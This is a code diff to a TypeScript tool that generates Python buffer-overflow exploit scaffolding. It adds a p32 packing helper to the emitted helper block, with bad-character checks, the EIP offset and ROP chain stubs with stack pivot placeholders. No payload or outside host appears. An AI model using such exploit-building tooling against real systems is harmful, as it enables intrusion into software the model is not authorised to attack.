@@ -180,11 +180,15 @@ function assignNames(table: Entry[]): void {
   }
 }
 
-// [1/7] finds nothing that belongs in the exploit, so its block is the three helpers every block below uses.
+// [1/7] finds nothing that belongs in the exploit, so its block is the helpers every block below uses.
+// p32 is one of them: pasted into an empty file, the blocks need only the two values his own work measured.
+// It packs with int.to_bytes, so the block imports nothing and never doubles an import his file already has.
 // Above it the evidence a screenshot keeps, below it the lines to paste.
 export const COPY_SEPARATOR = "# ------------------ copy into your exploit ------------------";
 
 export const HELPER_BLOCK: Block = { lines: [
+  "# needs OFFSET (from the crash) and BADCHARS (from the bad char hunt) already in this file",
+  "def p32(v): return (v & 0xFFFFFFFF).to_bytes(4, \"little\")",
   "def neg(v): return (-v) & 0xFFFFFFFF",
   "def clean(v): return not any(b in BADCHARS for b in p32(v))",
   "def hole(name): raise SystemExit(\"still to fill: \" + name)",
@@ -500,7 +504,7 @@ export function buildExploit(input: BuildInput): Build {
       "FRAME_AT = OFFSET - len(frame)     # field 1 sits here, so the chain starts on EIP",
     ];
     if (!capture || !add || !copy || !write || !pivot || add.move || copy.move) {
-      chain.push(...hole("c", "[4/7] has no exact pick for capture, add, copy, write or pivot: write this chain by hand"));
+      chain.push(...hole("payload", "[4/7] has no exact pick for capture, add, copy, write or pivot: write this chain and its payload by hand"));
     } else {
       const fns = frame.map((slot) => literal(slot) ? undefined : defineLoader(slot, valueRegister, [field]));
       chain.push(group("the captured ESP, and the address of field 1"));
